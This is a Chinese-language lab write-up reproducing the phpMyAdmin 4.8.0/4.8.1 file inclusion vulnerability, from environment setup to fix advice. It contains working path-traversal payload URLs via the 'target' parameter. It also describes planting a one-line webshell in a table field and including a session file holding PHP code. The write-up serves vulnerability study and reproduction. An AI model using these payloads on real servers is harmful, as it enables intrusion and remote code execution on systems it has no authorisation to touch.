## **0x00简介**

phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。

##  **0x01漏洞概述**

攻击者利用发现在服务器上包含（查看和潜在执行）文件的漏洞。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。
攻击者必须经过身份验证，但在这些情况下除外：

$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码；

$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码。

##  **0x02影响范围**

phpMyAdmin 4.8.0

phpMyAdmin 4.8.1

##  **0x03环境搭建**

phpstudy2018+phpmyadmin4.8.1

1.下载phpstudy2018然后删除自带的phpmyadmin

下载地址：http://public.xp.cn/upgrades/PhpStudy2018.zip

![](https://image.3001.net/images/20210105/1609839135_5ff4321f43b45071263e0.jpg!small)

2.下载phpmyadmin4.8.1版本

下载地址：https://www.phpmyadmin.net/files/

![](https://image.3001.net/images/20210105/1609839146_5ff4322a1862acb695712.jpg!small)

3.把下载好的phpmyadmin放入phpstudy的www目录下重新命名

![](https://image.3001.net/images/20210105/1609839166_5ff4323e457be648fbf76.jpg!small)

4.在浏览器查看phpmyadmin的版本

http://your-IP/phpmyadmin/README

![](https://image.3001.net/images/20210105/1609839178_5ff4324aee365327d2ca5.jpg!small)

##  **0x04漏洞复现**

1.在浏览器打开phpmyadmin，需要使用账号登录进去 //略显鸡肋

![](https://image.3001.net/images/20210105/1609839188_5ff432543488689bcfb8b.jpg!small)

2.方法一、登录进去在首页输入以下payload

http://your-ip/phpMyAdmin/index.php?target=db_datadict.php%253f/../../../../../../../../Windows\win.ini

![](https://image.3001.net/images/20210105/1609839197_5ff4325debc5d87fe395d.jpg!small)

3.在test数据库中创建一个表，然后在表中创建一个字段为一句话木马

![](https://image.3001.net/images/20210105/1609839210_5ff4326ab86a730f6bce8.jpg!small)

![](https://image.3001.net/images/20210105/1609839224_5ff432780d467f3980e71.jpg!small)

![](https://image.3001.net/images/20210105/1609839245_5ff4328d7cfc9bd7d8a8a.jpg!small)

4.在受害机查看MySQL/data对应数据库下生成一个frm文件是否写入进去，使用记事本打开

![](https://image.3001.net/images/20210105/1609839261_5ff4329d20d51d6e1414d.jpg!small)

5.使用文件包含，包含此路径下的文件

http://your-ip/phpMyAdmin/index.php?target=db_datadict.php%253f/../../../../../../../../phpStudy\PHPTutorial\MySQL\data\test\demo.frm

![](https://image.3001.net/images/20210105/1609839273_5ff432a91008c0dbe249f.jpg!small)

6.方法二、通过 phpsession序列化数据保存至session文件，包含其缓存文件。通过一句话木马，进而包含sess_sessionId文件。

6.1、在最新sql语句的地方执行以下命令

select ‘<?php phpinfo() ?>’;

![](https://image.3001.net/images/20210105/1609839285_5ff432b5c703f4e1c170f.jpg!small)

![](https://image.3001.net/images/20210105/1609839301_5ff432c500a851d9b0de6.jpg!small)

6.2、使用F12查看网站Session值，查看当前页面cookie中的phpmyadmin的值

![](https://image.3001.net/images/20210105/1609839315_5ff432d3ea2a7fa22c9c2.jpg!small)

![](https://image.3001.net/images/20210105/1609839331_5ff432e32f7a9def5f66d.jpg!small)

6.3、使用文件包含包含此目录下的Session值的URL路径

![](https://image.3001.net/images/20210105/1609839343_5ff432efee9b4337a1255.jpg!small)

##  **0x05修复建议**

1\. 建议使用最新版本的phpmyadmin

2\. 使用复杂的账号密码

